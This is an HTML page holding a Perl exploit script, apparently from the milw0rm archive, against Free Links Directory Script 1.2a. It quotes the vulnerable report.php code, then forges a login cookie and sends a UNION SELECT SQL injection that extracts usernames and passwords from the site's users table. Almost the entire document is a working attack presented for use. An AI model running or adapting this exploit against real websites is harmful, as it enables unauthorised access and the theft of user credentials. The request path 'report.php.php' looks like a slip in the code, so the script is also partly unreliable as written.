<html><head><title>FLDS 1.2a report.php (linkida) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w
#
# Free Links Directory Script V1.2a Remote SQL Injection Exploit
# written by ka0x &lt;ka0x01[alt+64]gmail.com&gt;
# D.O.M Labs Security Researchers
# - www.domlabs.org -
#
# Vuln code (report.php):
#
# if($_COOKIE['logged']==&quot;&quot;) {
# [...] // login
# else {
#     $linkida = $_GET['linkid'];
#     $linkinfo = mysql_fetch_array(mysql_query(&quot;select * from links where id=$linkida&quot;))
# [...]
#

use strict;
use LWP::UserAgent;
 
my $host = $ARGV[0];

die &quot;[*] usage: perl $0 &lt;host&gt;\n&quot; unless $ARGV[0];

if ($host !~ /^http:/){ $host = 'http://'.$host; }

my $ua = LWP::UserAgent-&gt;new() or die ;
$ua-&gt;agent(&quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008072820 Firefox/3.0.1&quot;) ;
$ua-&gt;timeout(10) ;
$ua-&gt;default_header('Cookie' =&gt; &quot;logged=d0ml4bs&quot;); # value $_COOKIE['logged'], Cookie: logged=d0ml4bs

my $req = HTTP::Request-&gt;new(GET =&gt; $host.&quot;report.php.php?linkid=-1/**/UNION/**/SELECT/**/1,concat(0x5f5f5f5f,0x5b215d20757365723a20,username,0x20205b215d20706173733a20,password,0x5f5f5f5f),3,4,5,6,7,8,9,10,11/**/FROM/**/users&quot;);

my $res = $ua-&gt;request($req);
my $con = $res-&gt;content;

if ($res-&gt;is_success &amp;&amp; $con =~ m/____(.*?)____/ms){
    print $1;
}
else {
    print &quot;[-] exploit failed!\n&quot;;
}

__END__

# milw0rm.com [2008-12-16]</pre></html>